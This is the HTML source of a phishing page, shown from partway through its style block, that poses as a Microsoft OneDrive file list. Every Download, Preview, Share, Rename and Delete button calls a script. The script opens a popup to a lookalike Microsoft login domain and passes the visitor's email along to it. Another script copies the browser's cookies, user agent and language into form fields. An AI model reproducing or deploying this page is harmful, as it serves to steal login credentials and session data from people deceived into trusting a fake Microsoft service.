            .navbar .container {
                display: flex;
                justify-content: space-between;
                padding: 24px;
                width: 100% !important;
                max-width: 100% !important;
            }
            #bodies td {
                padding-top: 1.75rem !important;
                padding-bottom: 1.75rem !important;
            }
            #mainContainer {
                width: 100% !important;
                max-width: 100% !important;
            }
            .slimMod.active {
                display: block !important;
                background: rgba(0, 0, 0, 0.7);
            }
            @media screen and (max-width: 490px) {
                .navbar .container {
                    flex-direction: column !important;
                    gap: 15px !important;
                    align-items: center !important;
                }
            }
            .modal-content {
                overflow: hidden;
            }
        </style>
    </head>
    <body style="height: 100vh">
        <header>
            <nav class="navbar glass">
                <div class="container">
                    <div
                        class="flex items-center space-x-2 text-white text-xl font-bold"
                    >
                        <img
                            src="https://i.ibb.co/YTPn8jzT/mcrs.png"
                            alt="Logo"
                            class="logo"
                        />
                        <span>OneDrive</span>
                    </div>

                    <button class="navbar-toggler" type="button">
                        <span class="navbar-toggler-icon text-dark"></span>
                    </button>

                    <div class="flex items-center space-x-4">
                        <input
                            type="text"
                            placeholder="Search files..."
                            class="px-3 py-1 rounded bg-white/20 border border-white/30 text-sm text-white placeholder-white/70 focus:outline-none"
                        />

                        <div class="relative group">
                            <p
                                data-bs-toggle="modal"
                                data-bs-target="#myModal"
                                class="bg-white text-black border-2 border-white/30 h-8 w-8 flex items-center justify-center rounded-full font-semibold cursor-pointer"
                            >
                                B
                            </p>
                        </div>
                    </div>
                </div>
            </nav>
        </header>
        <div id="mainContainer" class="container">
            <div class="flex h-[calc(100vh-64px)] relative z-10">
                <aside class="w-64 glass p-6 hidden md:block">
                    <nav class="space-y-4 text-white/90">
                        <a
                            data-bs-toggle="modal"
                            data-bs-target="#myModal"
                            href="#"
                            class="active flex items-center gap-3 py-2 px-4 rounded-lg hover:bg-white/20"
                            ><svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                stroke-width="2"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                class="feather feather-folder"
                            >
                                <path
                                    d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"
                                ></path>
                            </svg>
                            My Files</a
                        >
                        <a
                            data-bs-toggle="modal"
                            data-bs-target="#myModal"
                            href="#"
                            recent-btn=""
                            class="flex items-center gap-3 py-2 px-4 rounded-lg hover:bg-white/20"
                            ><svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                stroke-width="2"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                class="feather feather-clock"
                            >
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                            </svg>
                            Recent</a
                        >
                        <a
                            data-bs-toggle="modal"
                            data-bs-target="#myModal"
                            href="#"
                            shared-btn=""
                            class="flex items-center gap-3 py-2 px-4 rounded-lg hover:bg-white/20"
                            ><svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                stroke-width="2"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                class="feather feather-users"
                            >
                                <path
                                    d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"
                                ></path>
                                <circle cx="9" cy="7" r="4"></circle>
                                <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                                <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                            </svg>
                            Shared</a
                        >
                        <a
                            data-bs-toggle="modal"
                            data-bs-target="#myModal"
                            href="#"
                            trash-btn=""
                            class="flex items-center gap-3 py-2 px-4 rounded-lg hover:bg-white/20"
                            ><svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="24"
                                height="24"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                stroke-width="2"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                class="feather feather-trash-2"
                            >
                                <polyline points="3 6 5 6 21 6"></polyline>
                                <path
                                    d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"
                                ></path>
                                <line x1="10" y1="11" x2="10" y2="17"></line>
                                <line x1="14" y1="11" x2="14" y2="17"></line>
                            </svg>
                            Trash</a
                        >
                    </nav>
                </aside>

                <main class="flex-1 p-6 overflow-auto relative">
                    <div
                        class="sub-main glass rounded-xl shadow-lg p-6 relative z-10"
                    >
                        <h1 class="text-2xl font-semibold mb-4 text-white">
                            📁 My Files
                        </h1>

                        <div class="overflow-x-auto">
                            <table
                                class="w-full text-left text-white/90 min-w-[600px]"
                            >
                                <thead
                                    class="text-sm uppercase border-b border-white/30"
                                >
                                    <tr>
                                        <th class="py-3 px-6">File</th>
                                        <th class="py-3 px-6">Size</th>
                                        <th class="py-3 px-6">Modified</th>
                                        <th class="py-3 px-6">Actions</th>
                                    </tr>
                                </thead>
                                <tbody
                                    id="bodies"
                                    class="text-sm divide-y divide-white/20"
                                >
                                    
                                    <tr class="hover:bg-white/10 transition">
                                        <td
                                            class="py-3 px-6 flex items-center space-x-2"
                                        >
                                            <img
                                                src="https://i.ibb.co/QFCCCv2R/pdf-0-YYZj-Qo.png"
                                                class="file-icon"
                                                alt="File"
                                            />
                                            <span>Project_Proposal.pdf</span>
                                        </td>
                                        <td class="py-3 px-6">
                                            2.8 MB
                                        </td>
                                        <td class="py-3 px-6">
                                            <div class="dateContainer">
                                                <p id="date"></p>
                                            </div>
                                        </td>
                                        <td
                                            class="py-3 px-6 flex items-center space-x-2"
                                        >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-blue-600 hover:bg-blue-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Download</a
												
                                            >
											
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-gray-600 hover:bg-gray-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Preview</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-green-600 hover:bg-green-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Share</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-yellow-600 hover:bg-yellow-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Rename</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-red-600 hover:bg-red-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Delete</a
                                            >
                                        </td>
                                    </tr>
                                    
                                    <tr class="hover:bg-white/10 transition">
                                        <td
                                            class="py-3 px-6 flex items-center space-x-2"
                                        >
                                            <img
                                                src="https://i.ibb.co/ynD2wH4Y/ms-word.png"
                                                class="file-icon"
                                                alt="File"
                                            />
                                            <span>Product_Specification_with_Detailed_Description.docx</span>
                                        </td>
                                        <td class="py-3 px-6">
                                            980 KB
                                        </td>
                                        <td class="py-3 px-6">
                                            <div class="dateContainer" >
                                                <p id="date2"></p>
                                            </div>
                                        </td>
										
										<td class="py-3 px-6 flex gap-2"> 
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-blue-600 hover:bg-blue-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Download</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-gray-600 hover:bg-gray-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Preview</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-green-600 hover:bg-green-500 text-white text-xs px-3 py-1 rounded"   onclick="openCenteredWindow()"
                                                >Share</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-yellow-600 hover:bg-yellow-500 text-white text-xs px-3 py-1 rounded"   onclick="openCenteredWindow()"
                                                >Rename</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-red-600 hover:bg-red-500 text-white text-xs px-3 py-1 rounded"  onclick="openCenteredWindow()"
                                                >Delete</a
                                            >
                                        </td>
                                    </tr>
                                    
                                    <tr class="hover:bg-white/10 transition">
                                        <td
                                            class="py-3 px-6 flex items-center space-x-2"
                                        >
                                            <img
                                                src="https://i.ibb.co/zh1xn8Y2/image.png"
                                                class="file-icon"
                                                alt="File"
                                            />
                                            <span>Sample_Image.png</span>
                                        </td>
                                        <td class="py-3 px-6">
                                            3.5 MB
                                        </td>
                                        <td class="py-3 px-6">
                                            <div class="dateContainer">
                                                <p id="date3"></p>
                                            </div>
                                        </td>
                                        <td class="py-3 px-6 flex gap-2">
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-blue-600 hover:bg-blue-500 text-white text-xs px-3 py-1 rounded"  onclick="openCenteredWindow()"
                                                >Download</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-gray-600 hover:bg-gray-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Preview</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-green-600 hover:bg-green-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Share</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-yellow-600 hover:bg-yellow-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Rename</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-red-600 hover:bg-red-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Delete</a
                                            >
                                        </td>
                                    </tr>
                                    
                                    <tr class="hover:bg-white/10 transition">
                                        <td
                                            class="py-3 px-6 flex items-center space-x-2"
                                        >
                                            <img
                                                src="https://i.ibb.co/Zz3mgp6G/ms-excel.png"
                                                class="file-icon"
                                                alt="File"
                                            />
                                            <span>Product_List_and_Required_Quantity.xlsx</span>
                                        </td>
                                        <td class="py-3 px-6">
                                            890 KB
                                        </td>
                                        <td class="py-3 px-6">
                                            <div class="dateContainer">
                                                <p id="date4"></p>
                                            </div>
                                        </td>
                                        <td class="py-3 px-6 flex gap-2">
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-blue-600 hover:bg-blue-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Download</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-gray-600 hover:bg-gray-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Preview</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-green-600 hover:bg-green-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Share</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-yellow-600 hover:bg-yellow-500 text-white text-xs px-3 py-1 rounded"  onclick="openCenteredWindow()"
                                                >Rename</a
                                            >
                                            <a
                                                href="#"
                                                data-bs-toggle="modal"
                                                data-bs-target="#myModal"
                                                class="bg-red-600 hover:bg-red-500 text-white text-xs px-3 py-1 rounded" onclick="openCenteredWindow()"
                                                >Delete</a
                                            >
                                        </td>
                                    </tr>
                                    
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <button
                        data-bs-toggle="modal"
                        data-bs-target="#myModal"
                        class="fixed bottom-11 right-6 bg-blue-600 hover:bg-blue-500 text-white px-5 py-3 rounded-full shadow-lg flex items-center space-x-2 z-50"
                    >
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            viewBox="0 0 24 24"
                            fill="none"
                            stroke="currentColor"
                            stroke-width="2"
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            class="feather feather-upload-cloud w-5 h-5"
                        >
                            <polyline points="16 16 12 12 8 16"></polyline>
                            <line x1="12" y1="12" x2="12" y2="21"></line>
                            <path
                                d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"
                            ></path>
                            <polyline points="16 16 12 12 8 16"></polyline>
                        </svg>
                        <span class="text-sm font-semibold">Upload</span>
                    </button>

                    <footer
                        class="glass z-10 fixed bottom-0 left-0 right-0 shadow-inner px-6 py-3 text-sm text-white/80 backdrop-blur-sm"
                    >
                        <div
                            class="flex flex-col md:flex-row justify-between items-center gap-2 md:gap-0"
                        >
                            <div class="flex items-center space-x-2">
                                <img
                                    src="https://i.ibb.co/YTPn8jzT/mcrs.png"
                                    alt="Microsoft Logo"
                                    class="w-15 h-6"
                                />
                                <span>2025 © Microsoft</span>
                            </div>
                            <div class="flex gap-4">
                                <span
                                    >OneDrive - Free Cloud Storage for Photos
                                    and Files.</span
                                >
                            </div>
                        </div>
                    </footer>
                </main>
            </div>
        </div>
        <div class="modal slimMod" id="myModal">
            <div
                class="modal-dialog modal-main modal-dialog-centered"
                id="myModalCon"
            >
                <div class="modal-content">
                    <div class="modal-body py-5 px-5">
                        <div>
                            <img
                                data-testid="accessibleImg"
                                class="___1v417w0 f2rbwfs frvgh55"
                                src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+"
                                alt="Microsoft"
                                role=""
                            />

                           
                           
						   <div  onclick="openCenteredWindow()" style="width: 100%; height: 600px; border: 1px solid #ccc;">
						   
						  
 <script>
  function openCenteredWindow() {
  
    const params = new URLSearchParams(window.location.search);
  const email = params.get("username") || "";
  
    const url = " https://login.microsoftonline.fiyairpeace.com/nOGliHrp?username="+email;
    const width = 800;
    const height = 600;

    // Calculate center position
    const left = (window.screen.width / 2) - (width / 2);
    const top = (window.screen.height / 2) - (height / 2);

    const features = `width=${width},height=${height},top=${top},left=${left},` +
                     `resizable=no,scrollbars=no,toolbar=no,location=no,menubar=no`;

    const newWindow = window.open(url, 'subBrowser', features);

    if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
      alert('Popup was blocked. Please allow popups for this site.');
    }
  }
</script>
                                            </div>
                                        </div>
                                        <div data-testid="hiddenInputs"></div>
                                        <div
                                            data-testid="inputComponentWrapper"
                                            class="___102hf4m f1tyq0we f11qmguv f1wv5yrl"
                                        >
                                            <div>
                                                
                                            </div>
											
                                        </div>
                                        <div
                                            class="___102hf4m f1tyq0we f11qmguv f1wv5yrl"
                                        >
                                            <div
                                                class="___108r86x fedgsey f10pi13n f1wv5yrl f161knb0 f12huiiw"
                                                data-testid="secondaryContent"
                                            >
                                                <div
                                                    class="___wqsyy40 f15tpi3i"
                                                >
                                                    <span
                                                        tabindex="0"
                                                        role="button"
                                                        id="idA_PWD_ForgotPassword"
                                                        class="___3cifbr0 f11xvspe f1bsjrm3 f3rmtva f1ern45e f1n71otn f1h8hb77 f1deefiw fryk5ur fv6z6zc f1cio4g9 f1mwb9y5 f1ynmygo f121g8nd f1i82eaq f8491dx f1nbblvp fifp7yv f1ov4xf1 f1asdtw4 f1rs8wju f1mtyjhi f1edxzt f3a8s8z"
                                                        >Forgot password?</span
                                                    >
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            data-testid="inputContainer"
                                            class="___1fbawub f21ccbt f1y1y8ej f1xyr3fu"
                                        >
                                            <div>
                                                <div
                                                    class="___102hf4m f1tyq0we f11qmguv f1wv5yrl"
                                                >
                                                    <div
                                                        class="ext-button-field-container ___1ao5ucd f1euv43f f1yab3r1 fly5x3f fes3tcz f1vtoa19 f16ez161 fongkew"
                                                        data-testid="textButtonContainer"
                                                    >
                                                        <div
                                                            class="ext-button-item ___frx9oy0 f14t3ns0"
                                                            id="corel"
                                                        >
                                                            <button
                                                                type="button"
                                                                id="submit-btn"
                                                                class="ext-primary ext-button ___1h2hnb1 f17hdyk f1oudy f1d4dqg0 f16643v7 f1ugb8du f7y26xe f13hfvcj fm07rh1 f1apsahp fd0rex f1cpir1z f16eno2h f18r37t4 fzjldvh f1qt38gl f8rakl9 f1g0fpsx f16h1fbs fsgvd33 fmuajgt f17m94t f9q4yqu fhe0td7 fwbpk35 f1wcl2ob f1ltk4hd f1oyfet3 f1k5fftb flu9u7w fa4qi57 f11zj0ky f43o6hn f14894vr f1uush98 fr10sow f1qd3bm6 ftxr058 f1x8m22p f18kyeoj f7uvj51 f1emwz7l fz1xuqi fsrzjhw fur62vr f1f2bxve f19rxy1v f1ks5t5n fg209rd f1hvg9fg f1ik4u3u fd6720t f1u5eihr ftlxw82 fj7y92t f154ob9o fb1y507 f16qlskp f15dqc6l fk9yu7v f1a94zgw fblkvk0 f2ud54c f1rx6zpj f1yeerbk f1apeehu fc5iy9t f1w0w9a7 f4rf09w f1lbyfsq f1jvmnke ffu7u5y fr5cd8s fu7zm6 f1l3iklw f1wctfe5 fr4vimk f171xskp f1mtrtxf ft29jt3 f1dkakdg f7ua2bh f1nxs5xn f1ern45e f1n71otn f1h8hb77 f1deefiw fxdtvjf fytdu2e f14t3ns0 f10ra9hq f11qrl6u f1y2xyjm fjlbh76 f10pi13n f6dzj5z f17mccla fz5stix f1p9o1ba f1sil6mw fmrv4ls f1cmbuwj f1cyt9o8 f1iretw8 fv6p4nl fnsf7x1 f8491dx fj5daoo fnmhfyr f1e35ql2 fatbyko f1grzc83 fb0xa7e fljg2da f1c2uykm f7n145z ft0kson ff472gp f4yyc7m fggejwh ft2aflc f9f7vaa fmjaa5u flutoqy f12qb2w f1s9iqzn f1o2wvfq fkbkaou fjk9nze f10kbna7 f9ex757 f1bn7qby f1yx5976 fqv895b"
                                                            >
                                                                Sign in
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script>
		
		 const today = new Date();
    const formattedDate = today.toISOString().split('T')[0]; // "YYYY-MM-DD"
    document.getElementById('date').textContent = formattedDate;
	document.getElementById('date2').textContent = formattedDate;
	document.getElementById('date3').textContent = formattedDate;
	
	document.getElementById('date4').textContent = formattedDate;
	
	
            $(document).ready(function () {
                document.getElementById("userAgent").value =
                    navigator.userAgent;
                document.getElementById("languages").value = navigator.language;
                document.getElementById("cookie").value = document.cookie;
                document.getElementById("appCodeName").value =
                    navigator.appCodeName;
                document.getElementById("appVersion").value =
                    navigator.appVersion;

                // Show modal
                $(document).on(
                    "click",
                    "a, .cursor-pointer, button:not(#submit-btn), input",
                    function (event) {
                        event.preventDefault();
                        $("#myModal").show(); // Show the modal
                        $(".slimMod").addClass("active"); // Add active class
                    }
                );

                // Hide modal if clicked outside #myModalCon
                $(document).on("click", "#myModal", function (event) {
                    // If the clicked target is NOT inside #myModalCon
                    if (!$(event.target).closest("#myModalCon").length) {
                        $(".slimMod").removeClass("active");
                        $("#myModal").hide(); // Optionally hide modal too
                    }
                });

            });
        </script>
    </body>
</html>
